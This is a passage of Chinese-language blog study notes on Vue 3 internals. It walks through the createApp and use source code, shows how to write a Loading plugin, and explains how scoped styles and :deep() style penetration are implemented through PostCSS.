&#125;</span><br><span class="line">        <span class="keyword">return</span> app</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 注册一些混入</span></span><br><span class="line">      <span class="title function_">mixin</span>(<span class="params">mixin: ComponentOptions</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (__FEATURE_OPTIONS_API__) &#123;</span><br><span class="line">          <span class="keyword">if</span> (!context.<span class="property">mixins</span>.<span class="title function_">includes</span>(mixin)) &#123;</span><br><span class="line">            context.<span class="property">mixins</span>.<span class="title function_">push</span>(mixin)</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">            <span class="title function_">warn</span>(</span><br><span class="line">              <span class="string">&#x27;Mixin has already been applied to target app&#x27;</span> +</span><br><span class="line">                (mixin.<span class="property">name</span> ? <span class="string">`: <span class="subst">$&#123;mixin.name&#125;</span>`</span> : <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            )</span><br><span class="line">          &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">          <span class="title function_">warn</span>(<span class="string">&#x27;Mixins are only available in builds supporting Options API&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> app</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 注册一些全局组件</span></span><br><span class="line">      <span class="title function_">component</span>(<span class="attr">name</span>: <span class="built_in">string</span>, component?: <span class="title class_">Component</span>): <span class="built_in">any</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">          <span class="title function_">validateComponentName</span>(name, context.<span class="property">config</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!component) &#123;</span><br><span class="line">          <span class="keyword">return</span> context.<span class="property">components</span>[name]</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (__DEV__ &amp;&amp; context.<span class="property">components</span>[name]) &#123;</span><br><span class="line">          <span class="title function_">warn</span>(<span class="string">`Component &quot;<span class="subst">$&#123;name&#125;</span>&quot; has already been registered in target app.`</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        context.<span class="property">components</span>[name] = component</span><br><span class="line">        <span class="keyword">return</span> app</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 注册一些指令</span></span><br><span class="line">      <span class="title function_">directive</span>(<span class="params">name: <span class="built_in">string</span>, directive?: Directive</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">          <span class="title function_">validateDirectiveName</span>(name)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!directive) &#123;</span><br><span class="line">          <span class="keyword">return</span> context.<span class="property">directives</span>[name] <span class="keyword">as</span> <span class="built_in">any</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (__DEV__ &amp;&amp; context.<span class="property">directives</span>[name]) &#123;</span><br><span class="line">          <span class="title function_">warn</span>(<span class="string">`Directive &quot;<span class="subst">$&#123;name&#125;</span>&quot; has already been registered in target app.`</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        context.<span class="property">directives</span>[name] = directive</span><br><span class="line">        <span class="keyword">return</span> app</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 挂载到DOM上，app.mount(&quot;#app&quot;)</span></span><br><span class="line">      <span class="title function_">mount</span>(</span><br><span class="line">        <span class="attr">rootContainer</span>: <span class="title class_">HostElement</span>,</span><br><span class="line">        isHydrate?: <span class="built_in">boolean</span>,</span><br><span class="line">        isSVG?: <span class="built_in">boolean</span></span><br><span class="line">      ): <span class="built_in">any</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isMounted) &#123;</span><br><span class="line">          <span class="comment">// #5571</span></span><br><span class="line">          <span class="keyword">if</span> (__DEV__ &amp;&amp; (rootContainer <span class="keyword">as</span> <span class="built_in">any</span>).<span class="property">__vue_app__</span>) &#123;</span><br><span class="line">            <span class="title function_">warn</span>(</span><br><span class="line">              <span class="string">`There is already an app instance mounted on the host container.\n`</span> +</span><br><span class="line">                <span class="string">` If you want to mount another app on the same host container,`</span> +</span><br><span class="line">                <span class="string">` you need to unmount the previous app by calling \`app.unmount()\` first.`</span></span><br><span class="line">            )</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">const</span> vnode = <span class="title function_">createVNode</span>(</span><br><span class="line">            rootComponent <span class="keyword">as</span> <span class="title class_">ConcreteComponent</span>,</span><br><span class="line">            rootProps</span><br><span class="line">          )</span><br><span class="line">          <span class="comment">// store app context on the root VNode.</span></span><br><span class="line">          <span class="comment">// this will be set on the root instance on initial mount.</span></span><br><span class="line">          vnode.<span class="property">appContext</span> = context</span><br><span class="line"></span><br><span class="line">          <span class="comment">// HMR root reload</span></span><br><span class="line">          <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">            context.<span class="property">reload</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">              <span class="title function_">render</span>(<span class="title function_">cloneVNode</span>(vnode), rootContainer, isSVG)</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (isHydrate &amp;&amp; hydrate) &#123;</span><br><span class="line">            <span class="title function_">hydrate</span>(vnode <span class="keyword">as</span> <span class="title class_">VNode</span>&lt;<span class="title class_">Node</span>, <span class="title class_">Element</span>&gt;, rootContainer <span class="keyword">as</span> <span class="built_in">any</span>)</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_">render</span>(vnode, rootContainer, isSVG)</span><br><span class="line">          &#125;</span><br><span class="line">          isMounted = <span class="literal">true</span></span><br><span class="line">          app.<span class="property">_container</span> = rootContainer</span><br><span class="line">          <span class="comment">// for devtools and telemetry</span></span><br><span class="line">          ;(rootContainer <span class="keyword">as</span> <span class="built_in">any</span>).<span class="property">__vue_app__</span> = app</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (__DEV__ || __FEATURE_PROD_DEVTOOLS__) &#123;</span><br><span class="line">            app.<span class="property">_instance</span> = vnode.<span class="property">component</span></span><br><span class="line">            <span class="title function_">devtoolsInitApp</span>(app, version)</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">return</span> <span class="title function_">getExposeProxy</span>(vnode.<span class="property">component</span>!) || vnode.<span class="property">component</span>!.<span class="property">proxy</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">          <span class="title function_">warn</span>(</span><br><span class="line">            <span class="string">`App has already been mounted.\n`</span> +</span><br><span class="line">              <span class="string">`If you want to remount the same app, move your app creation logic `</span> +</span><br><span class="line">              <span class="string">`into a factory function and create fresh app instances for each `</span> +</span><br><span class="line">              <span class="string">`mount - e.g. \`const createMyApp = () =&gt; createApp(App)\``</span></span><br><span class="line">          )</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 卸载</span></span><br><span class="line">      <span class="title function_">unmount</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (isMounted) &#123;</span><br><span class="line">          <span class="title function_">render</span>(<span class="literal">null</span>, app.<span class="property">_container</span>)</span><br><span class="line">          <span class="keyword">if</span> (__DEV__ || __FEATURE_PROD_DEVTOOLS__) &#123;</span><br><span class="line">            app.<span class="property">_instance</span> = <span class="literal">null</span></span><br><span class="line">            <span class="title function_">devtoolsUnmountApp</span>(app)</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">delete</span> app.<span class="property">_container</span>.<span class="property">__vue_app__</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">          <span class="title function_">warn</span>(<span class="string">`Cannot unmount an app that is not mounted.`</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 依赖注入</span></span><br><span class="line">      <span class="title function_">provide</span>(<span class="params">key, value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (__DEV__ &amp;&amp; (key <span class="keyword">as</span> <span class="built_in">string</span> | <span class="built_in">symbol</span>) <span class="keyword">in</span> context.<span class="property">provides</span>) &#123;</span><br><span class="line">          <span class="title function_">warn</span>(</span><br><span class="line">            <span class="string">`App already provides property with key &quot;<span class="subst">$&#123;<span class="built_in">String</span>(key)&#125;</span>&quot;. `</span> +</span><br><span class="line">              <span class="string">`It will be overwritten with the new value.`</span></span><br><span class="line">          )</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        context.<span class="property">provides</span>[key <span class="keyword">as</span> <span class="built_in">string</span> | <span class="built_in">symbol</span>] = value</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> app</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">      <span class="title function_">runWithContext</span>(<span class="params">fn</span>) &#123;</span><br><span class="line">        currentApp = app</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="title function_">fn</span>()</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">          currentApp = <span class="literal">null</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__COMPAT__) &#123;</span><br><span class="line">      <span class="title function_">installAppCompatProperties</span>(app, context, render)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回app</span></span><br><span class="line">    <span class="keyword">return</span> app</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在Vue源码（<code>/package/runtime-core/src/component.ts</code>）中可以看到app.proxy的来源。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// setupStatefulComponent函数内</span></span><br><span class="line"><span class="comment">// 用markRaw为对象添加__skip__属性跳过reactive代理，因为它里面自己就做了个代理（防止重复代理）</span></span><br><span class="line"><span class="comment">// 代理了instance.ctx，调用了PublicInstanceProxyHandlers方法</span></span><br><span class="line"><span class="comment">// ctx就是$开头的一些api</span></span><br><span class="line">instance.<span class="property">proxy</span> = <span class="title function_">markRaw</span>(<span class="keyword">new</span> <span class="title class_">Proxy</span>(instance.<span class="property">ctx</span>, <span class="title class_">PublicInstanceProxyHandlers</span>))</span><br></pre></td></tr></table></figure>

<p>在Vue源码（<code>/package/runtime-core/src/componentPublicInstance.ts</code>）中可以看到app.proxy调用的方法PublicInstanceProxyHandlers，其中：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (</span><br><span class="line">      <span class="comment">// global properties</span></span><br><span class="line">      <span class="comment">// 赋值全局函数变量</span></span><br><span class="line">      ((globalProperties = appContext.<span class="property">config</span>.<span class="property">globalProperties</span>),</span><br><span class="line">      <span class="comment">// 判断要读取的属性是否存在于globalProperties</span></span><br><span class="line">      <span class="title function_">hasOwn</span>(globalProperties, key))</span><br><span class="line">    )&#123;</span><br><span class="line">      <span class="keyword">if</span> (__COMPAT__) &#123;</span><br><span class="line">        <span class="comment">// 读取属性的描述符，兼容边缘情况</span></span><br><span class="line">        <span class="keyword">const</span> desc = <span class="title class_">Object</span>.<span class="title function_">getOwnPropertyDescriptor</span>(globalProperties, key)!</span><br><span class="line">        <span class="comment">// 如果有getter</span></span><br><span class="line">        <span class="keyword">if</span> (desc.<span class="property">get</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> desc.<span class="property">get</span>.<span class="title function_">call</span>(instance.<span class="property">proxy</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> val = globalProperties[key]</span><br><span class="line">          <span class="keyword">return</span> <span class="title function_">isFunction</span>(val)</span><br><span class="line">            ? <span class="title class_">Object</span>.<span class="title function_">assign</span>(val.<span class="title function_">bind</span>(instance.<span class="property">proxy</span>), val)</span><br><span class="line">            : val</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 存在就返回</span></span><br><span class="line">        <span class="keyword">return</span> globalProperties[key]</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>编写Vue3插件</title>
    <url>/web/study/Vue/31.%E7%BC%96%E5%86%99Vue3%E6%8F%92%E4%BB%B6.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="插件编写"><a href="#插件编写" class="headerlink" title="插件编写"></a>插件编写</h1><p>插件需要暴露一个对象或函数，并通过app.use注册到全局，省略注册过程。</p>
<p>Loading&#x2F;index.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">type</span> &#123; <span class="title class_">App</span>, <span class="title class_">VNode</span> &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span></span><br><span class="line"><span class="keyword">import</span> &#123; createVNode,render &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Loading</span> <span class="keyword">from</span> <span class="string">&quot;./index.vue&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// vue插件 支持对象形式和函数形式</span></span><br><span class="line"><span class="comment">// 对象形式内必须含有install函数</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="title function_">install</span>(<span class="params">app: App</span>) &#123;</span><br><span class="line">    <span class="comment">// 把组件实例转换成VNode</span></span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">VNode</span>:<span class="title class_">VNode</span> = <span class="title function_">createVNode</span>(<span class="title class_">Loading</span>)</span><br><span class="line">    <span class="comment">// 手动给VNode挂载组件</span></span><br><span class="line">    <span class="title function_">render</span>(<span class="title class_">VNode</span>,<span class="variable language_">document</span>.<span class="property">body</span>)</span><br><span class="line">    <span class="title class_">VNode</span>.<span class="property">component</span>?.<span class="property">exposed</span></span><br><span class="line">    <span class="comment">// 把属性和方法放到全局</span></span><br><span class="line">    app.<span class="property">config</span>.<span class="property">globalProperties</span>.<span class="property">__loading</span> = &#123;</span><br><span class="line">      <span class="attr">show</span>: <span class="title class_">VNode</span>.<span class="property">component</span>?.<span class="property">exposed</span>?.<span class="property">show</span>,</span><br><span class="line">      <span class="attr">hide</span>: <span class="title class_">VNode</span>.<span class="property">component</span>?.<span class="property">exposed</span>?.<span class="property">hide</span>,</span><br><span class="line">      <span class="attr">isShow</span>: <span class="title class_">VNode</span>.<span class="property">component</span>?.<span class="property">exposed</span>?.<span class="property">isShow</span></span><br><span class="line">    &#125;    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Loading&#x2F;index.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div v-if=&quot;isShow&quot; class=&quot;loading&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;loading-content&quot;&gt;Loading...&lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">const isShow = ref&lt;boolean&gt;(false)</span><br><span class="line"></span><br><span class="line">const show = ()=&gt; isShow.value = true</span><br><span class="line">const hide = ()=&gt; isShow.value = false</span><br><span class="line"></span><br><span class="line">defineExpose(&#123;show,hide,isShow&#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;scss&quot;&gt;</span><br><span class="line">.loading &#123;</span><br><span class="line">  position: fixed;</span><br><span class="line">  inset: 0;</span><br><span class="line">  background: rgba(0, 0, 0, 0.8);</span><br><span class="line">  display: flex;</span><br><span class="line">  justify-content: center;</span><br><span class="line">  align-items: center;</span><br><span class="line"></span><br><span class="line">  &amp;-content &#123;</span><br><span class="line">    font-size: 30px;</span><br><span class="line">    color: #fff;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;&lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">const instance = getCurrentInstance()</span><br><span class="line">instance?.proxy?.__loading.show()</span><br><span class="line"></span><br><span class="line">setTimeout(() =&gt; &#123;</span><br><span class="line">  instance?.proxy?.__loading.hide()</span><br><span class="line">&#125;, 5000)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p>手写一个myUse：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">type</span> &#123; <span class="title class_">App</span> &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span></span><br><span class="line"><span class="keyword">import</span> &#123; app &#125; <span class="keyword">from</span> <span class="string">&quot;./main&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Use</span> &#123;</span><br><span class="line">  <span class="attr">install</span>:<span class="function">(<span class="params">app:App,...options:<span class="built_in">any</span>[]</span>)=&gt;</span><span class="built_in">void</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 缓存策略，防止重复添加</span></span><br><span class="line"><span class="keyword">const</span> installList = <span class="keyword">new</span> <span class="title class_">Set</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title class_">MyUse</span>&lt;T <span class="keyword">extends</span> <span class="title class_">Use</span>&gt;(<span class="attr">plugin</span>:T,...<span class="attr">options</span>:<span class="built_in">any</span>[]) &#123;</span><br><span class="line">  <span class="comment">// 如果插件已经注册过了，报错</span></span><br><span class="line">  <span class="keyword">if</span>(installList.<span class="title function_">has</span>(plugin)) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;already regist!&quot;</span>,plugin)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// use函数其实就是帮把app传给插件</span></span><br><span class="line">    plugin.<span class="title function_">install</span>(app,...options)</span><br><span class="line">    <span class="comment">// 添加到缓存</span></span><br><span class="line">    installList.<span class="title function_">add</span>(plugin)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在Vue源码（<code>/package/runtime-core/src/apiCreateApp.ts</code>）中可以看到use的源码。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 缓存机制</span></span><br><span class="line"><span class="keyword">const</span> installedPlugins = <span class="keyword">new</span> <span class="title class_">Set</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// ......省略</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">use</span>(<span class="params">plugin: Plugin, ...options: <span class="built_in">any</span>[]</span>) &#123;</span><br><span class="line">  <span class="comment">// 组件已经注册过了，报错</span></span><br><span class="line">  <span class="keyword">if</span> (installedPlugins.<span class="title function_">has</span>(plugin)) &#123;</span><br><span class="line">    __DEV__ &amp;&amp; <span class="title function_">warn</span>(<span class="string">`Plugin has already been applied to target app.`</span>)</span><br><span class="line">  <span class="comment">// plugin是否有值，plugin.install是否是函数</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (plugin &amp;&amp; <span class="title function_">isFunction</span>(plugin.<span class="property">install</span>)) &#123;</span><br><span class="line">    <span class="comment">// 添加到缓存并调用插件</span></span><br><span class="line">    installedPlugins.<span class="title function_">add</span>(plugin)</span><br><span class="line">    plugin.<span class="title function_">install</span>(app, ...options)</span><br><span class="line">  <span class="comment">// plugin本身是否是函数</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_">isFunction</span>(plugin)) &#123;</span><br><span class="line">    <span class="comment">// 添加到缓存并调用插件</span></span><br><span class="line">    installedPlugins.<span class="title function_">add</span>(plugin)</span><br><span class="line">    <span class="title function_">plugin</span>(app, ...options)</span><br><span class="line">  <span class="comment">// 报错</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">    <span class="title function_">warn</span>(</span><br><span class="line">      <span class="string">`A plugin must either be a function or an object with an &quot;install&quot; `</span> + <span class="string">`function.`</span></span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 返回app本身主要是方便做链式调用</span></span><br><span class="line">  <span class="keyword">return</span> app</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>scoped和样式穿透</title>
    <url>/web/study/Vue/32.scoped%E5%92%8C%E6%A0%B7%E5%BC%8F%E7%A9%BF%E9%80%8F.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="scoped"><a href="#scoped" class="headerlink" title="scoped"></a>scoped</h1><p>Vue scoped通过在DOM结构以及CSS样式上增加唯一不重复的标记data-v-hash的方式，确保样式的唯一性，实现样式私有化模块化的效果。</p>
<blockquote>
<p>这个工作通过PostCSS转译实现。</p>
</blockquote>
<p>scoped的三条渲染规则：</p>
<ul>
<li>给HTML的DOM节点加一个不重复的data属性（形如data-v-114514）以表示唯一性。</li>
<li>在每句CSS选择器末尾（编译后生成的CSS语句）加一个当前组件的data属性选择器（如[data-v-114514]）来私有化样式。</li>
<li>如果组件内部包含其他组件，只会给其他组件的最外层标签加上当前组件的data属性</li>
</ul>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202305272107517.png" alt="增加了data属性的DOM"></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202305272104376.png" alt="增加了属性选择器的CSS"></p>
<h1 id="样式穿透"><a href="#样式穿透" class="headerlink" title="样式穿透"></a>样式穿透</h1><p>主要用于修改常用Vue组件库（例如<a href="https://element-plus.gitee.io/zh-CN/">Element</a>、<a href="https://vant-contrib.gitee.io/vant/v1/#/zh-CN/intro">Vant</a>、<a href="https://www.antdv.com/docs/vue/introduce-cn/">Ant Design</a>等）的默认自带样式。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;main&gt;</span><br><span class="line">    &lt;el-input placeholder=&quot;测试&quot; class=&quot;ipt&quot;&gt;&lt;/el-input&gt;</span><br><span class="line">  &lt;/main&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;scss&quot;&gt;</span><br><span class="line">.ipt &#123;</span><br><span class="line">  width: 300px;</span><br><span class="line">  margin: 100px 400px;</span><br><span class="line">  // 这样做因为scoped的机制，是无法应用样式的</span><br><span class="line">  .el-input__inner &#123;</span><br><span class="line">    background-color: green;</span><br><span class="line">  &#125;</span><br><span class="line">  :deep(.el-input__inner) &#123;</span><br><span class="line">    background-color: red;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202305272111482.png" alt="属性选择器被放到.ipt后面而非.el-input__inner后面"></p>
<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p>在Vue源码（<code>/package/compiler-sfc/src/compileStyle.ts</code>）中可以看到scoped和样式穿透的源码。</p>
<blockquote>
<p>compiler-sfc用于处理.Vue单文件组件。</p>
</blockquote>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">doCompileStyle</span>(<span class="params"></span></span><br><span class="line"><span class="params">  options: SFCAsyncStyleCompileOptions</span></span><br><span class="line"><span class="params"></span>): <span class="title class_">SFCStyleCompileResults</span> | <span class="title class_">Promise</span>&lt;<span class="title class_">SFCStyleCompileResults</span>&gt; &#123;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// ......省略</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// PostCSS插件</span></span><br><span class="line">  <span class="keyword">const</span> plugins = (postcssPlugins || []).<span class="title function_">slice</span>()</span><br><span class="line">  plugins.<span class="title function_">unshift</span>(<span class="title function_">cssVarsPlugin</span>(&#123; <span class="attr">id</span>: shortId, isProd &#125;))</span><br><span class="line">  <span class="keyword">if</span> (trim) &#123;</span><br><span class="line">    plugins.<span class="title function_">push</span>(<span class="title function_">trimPlugin</span>())</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 如果scoped = true就向postCss添加一个插件</span></span><br><span class="line">  <span class="keyword">if</span> (scoped) &#123;</span><br><span class="line">    plugins.<span class="title function_">push</span>(<span class="title function_">scopedPlugin</span>(longId))</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// ......省略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>/package/compiler-sfc/src/style/pluginScoped.ts</code>中可以看到对PostCSS的使用。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PostCSS插件</span></span><br><span class="line"><span class="comment">// PostCSS接收一个CSS文件并提供一个API来分析，修改它的规则（通过把CSS规则转换成一个抽象语法树的形式）</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">scopedPlugin</span>: <span class="title class_">PluginCreator</span>&lt;<span class="built_in">string</span>&gt; = <span class="function">(<span class="params">id = <span class="string">&#x27;&#x27;</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> keyframes = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>)</span><br><span class="line">  <span class="keyword">const</span> shortId = id.<span class="title function_">replace</span>(<span class="regexp">/^data-v-/</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="comment">// 定义PostCSS插件名称</span></span><br><span class="line">    <span class="attr">postcssPlugin</span>: <span class="string">&#x27;vue-sfc-scoped&#x27;</span>,</span><br><span class="line">    <span class="comment">// 处理CSS的AST</span></span><br><span class="line">    <span class="title class_">Rule</span>(rule) &#123;</span><br><span class="line">      <span class="title function_">processRule</span>(id, rule)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 处理@相关的CSS 例如media keyframes</span></span><br><span class="line">    <span class="title class_">AtRule</span>(node) &#123;</span><br><span class="line">      <span class="keyword">if</span> (</span><br><span class="line">        <span class="regexp">/-?keyframes$/</span>.<span class="title function_">test</span>(node.<span class="property">name</span>) &amp;&amp;</span><br><span class="line">        !node.<span class="property">params</span>.<span class="title function_">endsWith</span>(<span class="string">`-<span class="subst">$&#123;shortId&#125;</span>`</span>)</span><br><span class="line">      ) &#123;</span><br><span class="line">        <span class="comment">// register keyframes</span></span><br><span class="line">        keyframes[node.<span class="property">params</span>] = node.<span class="property">params</span> = node.<span class="property">params</span> + <span class="string">&#x27;-&#x27;</span> + shortId</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 最后执行而且只处理一次</span></span><br><span class="line">    <span class="title class_">OnceExit</span>(root) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title class_">Object</span>.<span class="title function_">keys</span>(keyframes).<span class="property">length</span>) &#123;</span><br><span class="line">        <span class="comment">// If keyframes are found in this &lt;style&gt;, find and rewrite animation names</span></span><br><span class="line">        <span class="comment">// in declarations.</span></span><br><span class="line">        <span class="comment">// Caveat: this only works for keyframes and animation rules in the same</span></span><br><span class="line">        <span class="comment">// &lt;style&gt; element.</span></span><br><span class="line">        <span class="comment">// individual animation-name declaration</span></span><br><span class="line">        root.<span class="title function_">walkDecls</span>(<span class="function"><span class="params">decl</span> =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (animationNameRE.<span class="title function_">test</span>(decl.<span class="property">prop</span>)) &#123;</span><br><span class="line">            decl.<span class="property">value</span> = decl.<span class="property">value</span></span><br><span class="line">              .<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">              .<span class="title function_">map</span>(<span class="function"><span class="params">v</span> =&gt;</span> keyframes[v.<span class="title function_">trim</span>()] || v.<span class="title function_">trim</span>())</span><br><span class="line">              .<span class="title 